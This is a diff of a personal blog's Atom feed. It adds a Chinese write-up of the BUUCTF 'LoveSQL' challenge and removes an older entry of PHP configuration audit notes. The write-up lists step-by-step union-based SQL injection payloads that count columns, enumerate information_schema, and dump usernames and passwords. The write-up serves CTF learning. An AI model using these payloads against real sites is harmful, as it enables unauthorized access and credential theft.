@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-06-08T09:42:40.468Z</updated>
+  <updated>2020-06-11T14:38:55.698Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>极客大挑战2019-LoveSQL</title>
+    <link href="http://lingxin16.github.io/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/"/>
+    <id>http://lingxin16.github.io/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/</id>
+    <published>2020-06-11T13:56:16.000Z</published>
+    <updated>2020-06-11T14:38:55.698Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目  熟悉的界面</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/1.png" alt="1"></p><p>有一行红字用 sqlmap 是没有灵魂的 用sqlmap跑一下，但是失败了</p><p>还是手动吧   用万能密码登录得到</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/2.png" alt="2"></p><p>登陆成功，并提示密码，密码尝试用md5爆破无果</p><p>然后就是普通的sql注入了..</p><p>username=1’order by 1#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/3.png" alt="3"></p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/4.png" alt="4"></p><p>username=1’order by 4#的时候出现Unknown column ‘4’ in ‘order clause’</p><p>说明总共有三个字段</p><p>username=1’union select 1,2,3 #</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/5.png" alt="5"></p><p>得到回显点2和3</p><p>username=1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/6.png" alt="6"></p><p>得到两个表geekuser和l0ve1ysq1</p><p>username=1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’geekuser’#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/7.png" alt="7"></p><p>得到三个字段id，username和password</p><p>爆破这三个字段</p><p>username=1’union select 1,group_concat(id,username,password),3 from geekuser#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/8.png" alt="8"></p><p>没有flag</p><p>接下来换l0ve1ysq1表 </p><p>username=1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’l0ve1ysq1’#</p><p>得到一样的三个字段 </p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/9.png" alt="9"></p><p>爆破这三个字段</p><p>1’union select 1,group_concat(id,username,password),3 from l0ve1ysq1#</p><p>得到flag</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/10.png" alt="10"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>CVE-2020-0796复现</title>
@@ -416,27 +439,6 @@
     
       &lt;h2 id=&quot;代码调试&quot;&gt;&lt;a href=&quot;#代码调试&quot; class=&quot;headerlink&quot; title=&quot;代码调试&quot;&gt;&lt;/a&gt;代码调试&lt;/h2&gt;&lt;p&gt;echo&lt;/p&gt;
 &lt;p&gt;​    最简单的输出数据调试方法，一般用来输出变量值或者不确定执行到哪个分支&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>代码审计day1</title>
-    <link href="http://lingxin16.github.io/2020/03/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day1/"/>
-    <id>http://lingxin16.github.io/2020/03/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day1/</id>
-    <published>2020-03-17T13:48:33.000Z</published>
-    <updated>2020-03-17T15:36:14.221Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="魔术引号自动过滤"><a href="#魔术引号自动过滤" class="headerlink" title="魔术引号自动过滤"></a>魔术引号自动过滤</h3><a id="more"></a><p>magic_quotes_gpc= on (在PHP5.4.0中被移除)</p><p>如果是开启状态，那么将自动对用户提交的sql语句进行转义</p><p>会把所有的单引号(“’’”)双引号(““””)反斜杠(”\“)和空字符(NULL)加上反斜杠进行转义</p><p>可以使用addslashes来转义提交的请求，或者用stripslashes来删除转义</p><h3 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h3><h4 id="是否允许包含远程文件"><a href="#是否允许包含远程文件" class="headerlink" title="是否允许包含远程文件"></a>是否允许包含远程文件</h4><p>allow_url_include= off</p><h4 id="是否允许打开远程文件"><a href="#是否允许打开远程文件" class="headerlink" title="是否允许打开远程文件"></a>是否允许打开远程文件</h4><p>allow_url_open= on</p><h3 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h3><h4 id="HTTP头部版本信息"><a href="#HTTP头部版本信息" class="headerlink" title="HTTP头部版本信息"></a>HTTP头部版本信息</h4><p>expose_php = off</p><p>防止通过http头部泄露php的版本信息</p><h4 id="文件上传临时目录"><a href="#文件上传临时目录" class="headerlink" title="文件上传临时目录"></a>文件上传临时目录</h4><p>upload_tmp_dir=</p><p>上传文件临时保存的目录，如果不设置的话，则采用系统的临时目录</p><h4 id="用户可访问目录"><a href="#用户可访问目录" class="headerlink" title="用户可访问目录"></a>用户可访问目录</h4><p>open_basedir = </p><p>能够控制PHP脚本只能访问指定目录</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;魔术引号自动过滤&quot;&gt;&lt;a href=&quot;#魔术引号自动过滤&quot; class=&quot;headerlink&quot; title=&quot;魔术引号自动过滤&quot;&gt;&lt;/a&gt;魔术引号自动过滤&lt;/h3&gt;
     
     </summary>
     
